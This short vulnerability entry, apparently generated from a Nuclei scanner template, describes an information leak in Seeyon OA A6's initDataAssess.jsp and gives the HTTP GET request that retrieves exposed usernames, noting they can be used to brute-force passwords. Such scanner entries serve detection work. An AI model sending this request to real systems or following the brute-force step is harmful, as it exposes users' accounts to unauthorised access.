# Vulnerability: Seeyon OA A6 initDataAssess.jsp - Information Disclosure
**Classification:** SEEYON
**Source:** Nuclei Template (`seeyon-initdata-exposure.yaml`)

## Description
Seeyon OA A6 initDataAssess.jsp has leaked user sensitive information, attacker can use the obtained username to blast the user's password to enter the background for further attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /yyoa/assess/js/initDataAssess.jsp HTTP/1.1
Host: {{Hostname}}
```

